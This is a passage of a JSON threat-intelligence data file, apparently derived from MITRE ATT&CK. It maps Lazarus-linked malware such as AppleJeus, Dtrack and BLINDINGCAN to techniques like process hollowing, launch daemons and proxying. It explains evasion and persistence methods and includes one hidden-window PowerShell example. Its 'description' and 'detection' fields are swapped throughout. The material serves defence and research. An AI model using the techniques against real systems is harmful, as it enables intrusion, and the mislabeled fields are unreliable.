                "detection": "Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with.  The certificates used during an operation may be created, acquired, or stolen by the adversary.   Unlike Invalid Code Signature, this activity will result in a valid signature.\n\nCode signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform.  \n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system.",
                "is_subtype": true,
                "platforms": [
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1218.007",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Msiexec",
                "chain_phase": "defense-evasion",
                "description": "Use process monitoring to monitor the execution and arguments of msiexec.exe. Compare recent invocations of msiexec.exe with prior history of known good arguments and executed MSI files or DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of msiexec.exe may also be useful in determining the origin and purpose of the MSI files or DLLs being executed.",
                "detection": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi). Msiexec.exe is digitally signed by Microsoft.\n\nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs. Since it is signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1543.004",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Launch Daemon",
                "chain_phase": "persistence",
                "description": "Monitor for launch daemon creation or modification through plist files and utilities such as Objective-See's KnockKnock application. ",
                "detection": "Adversaries may create or modify launch daemons to repeatedly execute malicious payloads as part of persistence. Per Apple’s developer documentation, when macOS and OS X boot up, launchd is run to finish system initialization. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in <code>/System/Library/LaunchDaemons</code> and <code>/Library/LaunchDaemons</code> . These LaunchDaemons have property list files which point to the executables that will be launched . \n\nAdversaries may install a new launch daemon that can be configured to execute at startup by using launchd or launchctl to load a plist into the appropriate directories  . The daemon name may be disguised by using a name from a related operating system or benign software . Launch Daemons may be created with administrator privileges, but are executed under root privileges, so an adversary may also use a service to escalate privileges from administrator to root. \n\nThe plist file permissions must be root:wheel, but the script or program that it points to has no such requirement. So, it is possible for poor configurations to allow an adversary to modify a current Launch Daemon’s executable and gain persistence or Privilege Escalation.",
                "is_subtype": true,
                "platforms": [
                    "macOS"
                ]
            }
        },
        {
            "id": "S0584",
            "type": "tool",
            "attributes": {
                "name": "AppleJeus",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "AppleJeus is a family of downloaders initially discovered in 2018 embedded within trojanized cryptocurrency applications. AppleJeus has been used by Lazarus Group, targeting companies in the energy, finance, government, industry, technology, and telecommunications sectors, and several countries including the United States, United Kingdom, South Korea, Australia, Brazil, New Zealand, and Russia. AppleJeus has been used to distribute the FALLCHILL RAT.",
                "platforms": [
                    "Windows",
                    "macOS"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1569.001": "Launchctl",
                    "T1059.004": "Unix Shell",
                    "T1497.003": "Time Based Evasion",
                    "T1566.002": "Spearphishing Link",
                    "T1564.001": "Hidden Files and Directories",
                    "T1553.002": "Code Signing",
                    "T1070.004": "File Deletion",
                    "T1548.002": "Bypass User Account Control",
                    "T1218.007": "Msiexec",
                    "T1543.004": "Launch Daemon",
                    "T1543.003": "Windows Service",
                    "T1053.005": "Scheduled Task",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1082": "System Information Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 19
        },
        {
            "id": "T1574",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Hijack Execution Flow",
                "chain_phase": "persistence",
                "description": "Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious.\n\nLook for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.\n\nMonitor for changes to environment variables, as well as the commands to implement these changes.\n\nMonitor processes for unusual activity (e.g., a process that does not use the network begins to do so, abnormal process call trees). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.\n\nService changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information. (Citation: Autoruns for Windows) Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.",
                "detection": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.\n\nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1547",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Boot or Logon Autostart Execution",
                "chain_phase": "persistence",
                "description": "Monitor for additions or modifications of mechanisms that could be used to trigger autostart execution, such as relevant additions to the Registry. Look for changes that are not correlated with known updates, patches, or other planned administrative activity. Tools such as Sysinternals Autoruns may also be used to detect system autostart configuration changes that could be attempts at persistence.(Citation: TechNet Autoruns)  Changes to some autostart configuration settings may happen under normal conditions when legitimate software is installed. \n\nSuspicious program execution as autostart programs may show up as outlier processes that have not been seen before when compared against historical data.To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\nMonitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL.\n\nMonitor for abnormal usage of utilities and command-line parameters involved in kernel modification or driver installation.",
                "detection": "Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.  These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.\n\nSince some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1055.012",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Process Hollowing",
                "chain_phase": "defense-evasion",
                "description": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",
                "detection": "Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  \n\nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.\n\nThis is very similar to Thread Local Storage but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1217",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Browser Bookmark Discovery",
                "chain_phase": "discovery",
                "description": "Monitor processes and command-line arguments for actions that could be taken to gather browser bookmark information. Remote access tools with built-in features may interact directly using APIs to gather information. Information may also be acquired through system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.",
                "detection": "Adversaries may enumerate browser bookmarks to learn more about compromised hosts. Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.\n\nBrowser bookmarks may also highlight additional targets after an adversary has access to valid credentials, especially Credentials In Files associated with logins cached by a browser.\n\nSpecific storage locations vary based on platform and/or application, but browser bookmarks are typically stored in local files/databases.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1129",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Shared Modules",
                "chain_phase": "execution",
                "description": "Monitoring DLL module loads may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances, since benign use of Windows modules load functions are common and may be difficult to distinguish from malicious behavior. Legitimate software will likely only need to load routine, bundled DLL modules or Windows system DLLs such that deviation from known module loads may be suspicious. Limiting DLL module loads to <code>%SystemRoot%</code> and <code>%ProgramFiles%</code> directories will protect against module loads from unsafe paths. \n\nCorrelation of other events with behavior surrounding module loads using API monitoring and suspicious DLLs written to disk will provide additional context to an event that may assist in determining if it is due to malicious behavior.",
                "detection": "Adversaries may abuse shared modules to execute malicious payloads. The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like <code>CreateProcess</code>, <code>LoadLibrary</code>, etc. of the Win32 API. \n\nThe module loader can load DLLs:\n\n* via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;\n    \n* via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);\n    \n* via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;\n    \n* via <code>&#x3c;file name=\"filename.extension\" loadFrom=\"fully-qualified or relative pathname\"&#x3e;</code> in an embedded or external \"application manifest\". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.\n\nAdversaries may use this functionality as a way to execute arbitrary code on a victim system. For example, malware may execute share modules to load additional components or features.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1078",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Valid Accounts",
                "chain_phase": "defense-evasion",
                "description": "Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services. (Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nPerform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence. Checks on these accounts could also include whether default accounts such as Guest have been activated. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.",
                "detection": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace",
                    "Containers"
                ]
            }
        },
        {
            "id": "S0567",
            "type": "tool",
            "attributes": {
                "name": "Dtrack",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Dtrack is spyware that was discovered in 2019 and has been used against Indian financial institutions, research facilities, and the Kudankulam Nuclear Power Plant. Dtrack shares similarities with the DarkSeoul campaign, which was attributed to Lazarus Group.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1074.001": "Local Data Staging",
                    "T1574": "Hijack Execution Flow",
                    "T1059.003": "Windows Command Shell",
                    "T1560": "Archive Collected Data",
                    "T1056.001": "Keylogging",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1070.004": "File Deletion",
                    "T1547": "Boot or Logon Autostart Execution",
                    "T1543.003": "Windows Service",
                    "T1055.012": "Process Hollowing",
                    "T1217": "Browser Bookmark Discovery",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1129": "Shared Modules",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1078": "Valid Accounts",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry",
                    "T1005": "Data from Local System"
                }
            },
            "val": 23
        },
        {
            "id": "T1132.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Standard Encoding",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.  Some data encoding systems may also result in data compression, such as gzip.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1566.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Spearphishing Attachment",
                "chain_phase": "initial-access",
                "description": "Network intrusion detection systems and email gateways can be used to detect spearphishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.\n\nFiltering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)\n\nAnti-virus can potentially detect malicious documents and attachments as they're scanned to be stored on the email server or on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the attachment is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) or usage of malicious scripts.\n\nMonitor for suspicious descendant process spawning from Microsoft Office and other productivity software.(Citation: Elastic - Koadiac Detection with EQL)",
                "detection": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.",
                "is_subtype": true,
                "platforms": [
                    "macOS",
                    "Windows",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1027.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Software Packing",
                "chain_phase": "defense-evasion",
                "description": "Use file scanning to look for known software packers or artifacts of packing techniques. Packing is not a definitive indicator of malicious activity, because legitimate software may use packing techniques to reduce binary size or to protect proprietary code.",
                "detection": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code. \n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available,  but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.",
                "is_subtype": true,
                "platforms": [
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0520",
            "type": "tool",
            "attributes": {
                "name": "BLINDINGCAN",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "BLINDINGCAN is a remote access Trojan that has been used by the North Korean government since at least early 2020 in cyber operations against defense, engineering, and government organizations in Western Europe and the US.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1204.002": "Malicious File",
                    "T1059.003": "Windows Command Shell",
                    "T1566.001": "Spearphishing Attachment",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1553.002": "Code Signing",
                    "T1027.002": "Software Packing",
                    "T1070.006": "Timestomp",
                    "T1070.004": "File Deletion",
                    "T1218.011": "Rundll32",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1129": "Shared Modules",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery",
                    "T1005": "Data from Local System"
                }
            },
            "val": 21
        },
        {
            "id": "T1573",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Encrypted Channel",
                "chain_phase": "command-and-control",
                "description": "SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.(Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.(Citation: SEI SSL Inspection Risks)\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1095",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Non-Application Layer Protocol",
                "chain_phase": "command-and-control",
                "description": "Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.(Citation: Cisco Blog Legacy Device Attacks)\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2) \n\nMonitor and investigate API calls to functions associated with enabling and/or utilizing alternative communication channels.",
                "detection": "Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example.\n Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts;  however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS",
                    "Network"
                ]
            }
        },
        {
            "id": "S0498",
            "type": "tool",
            "attributes": {
                "name": "Cryptoistic",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Cryptoistic is a backdoor, written in Swift, that has been used by Lazarus Group.",
                "platforms": [
                    "macOS"
                ],
                "techniques": {
                    "T1573": "Encrypted Channel",
                    "T1070.004": "File Deletion",
                    "T1105": "Ingress Tool Transfer",
                    "T1095": "Non-Application Layer Protocol",
                    "T1083": "File and Directory Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1005": "Data from Local System"
                }
            },
            "val": 7
        },
        {
            "id": "T1543.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Launch Agent",
                "chain_phase": "persistence",
                "description": "Monitor Launch Agent creation through additional plist files and utilities such as Objective-See’s  KnockKnock application. Launch Agents also require files on disk for persistence which can also be monitored via other file monitoring applications.",
                "detection": "Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. Per Apple’s developer documentation, when a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (plist) files found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>$HOME/Library/LaunchAgents</code>   . These launch agents have property list files which point to the executables that will be launched .\n \nAdversaries may install a new launch agent that can be configured to execute at login by using launchd or launchctl to load a plist into the appropriate directories    . The agent name may be disguised by using a name from a related operating system or benign software. Launch Agents are created with user level privileges and are executed with the privileges of the user when they log in  . They can be set up to execute when a specific user logs in (in the specific user’s directory structure) or when any user logs in (which requires administrator privileges).",
                "is_subtype": true,
                "platforms": [
                    "macOS"
                ]
            }
        },
        {
            "id": "S0497",
            "type": "tool",
            "attributes": {
                "name": "Dacls",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Dacls is a multi-platform remote access tool used by Lazarus Group since at least December 2019.",
                "platforms": [
                    "macOS",
                    "Linux",
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1564.001": "Hidden Files and Directories",
                    "T1543.004": "Launch Daemon",
                    "T1543.001": "Launch Agent",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1057": "Process Discovery",
                    "T1036": "Masquerading",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 9
        },
        {
            "id": "T1564.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Hidden Window",
                "chain_phase": "defense-evasion",
                "description": "Monitor processes and command-line arguments for actions indicative of hidden windows. In Windows, enable and configure event logging and PowerShell logging to check for the hidden window style. In MacOS, plist files are ASCII text files with a specific format, so they're relatively easy to parse. File monitoring can check for the <code>apple.awt.UIElement</code> or any other suspicious plist tag in plist files and flag them.",
                "detection": "Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \n\nOn Windows, there are a variety of features in scripting languages in Windows, such as PowerShell, Jscript, and Visual Basic to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>. \n\nSimilarly, on macOS the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\n\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.",
                "is_subtype": true,
                "platforms": [
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1010",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Application Window Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used or give context to information collected by a keylogger.",
                "is_subtype": false,
                "platforms": [
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0431",
            "type": "tool",
            "attributes": {
                "name": "HotCroissant",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "HotCroissant is a remote access trojan (RAT) attributed by U.S. government entities to malicious North Korean government cyber activity, tracked collectively as HIDDEN COBRA. HotCroissant shares numerous code similarities with Rifdoor.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1564.003": "Hidden Window",
                    "T1059.003": "Windows Command Shell",
                    "T1027.002": "Software Packing",
                    "T1070.004": "File Deletion",
                    "T1053.005": "Scheduled Task",
                    "T1518": "Software Discovery",
                    "T1489": "Service Stop",
                    "T1113": "Screen Capture",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery",
                    "T1010": "Application Window Discovery",
                    "T1007": "System Service Discovery"
                }
            },
            "val": 20
        },
        {
            "id": "T1571",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Non-Standard Port",
                "chain_phase": "command-and-control",
                "description": "Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may communicate using a protocol and port paring that are typically not associated. For example, HTTPS over port 8088 or port 587 as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1562.004",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Disable or Modify System Firewall",
                "chain_phase": "defense-evasion",
                "description": "Monitor processes and command-line arguments to see if firewalls are disabled or modified. Monitor Registry edits to keys that manage firewalls.",
                "detection": "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\n\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1090",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Proxy",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)\n\nConsider monitoring for traffic to known anonymity networks (such as [Tor](https://attack.mitre.org/software/S0183)).",
                "detection": "Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.\n\nAdversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Network"
                ]
            }
        },
        {
            "id": "T1065",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Uncommonly Used Port",
                "chain_phase": null,
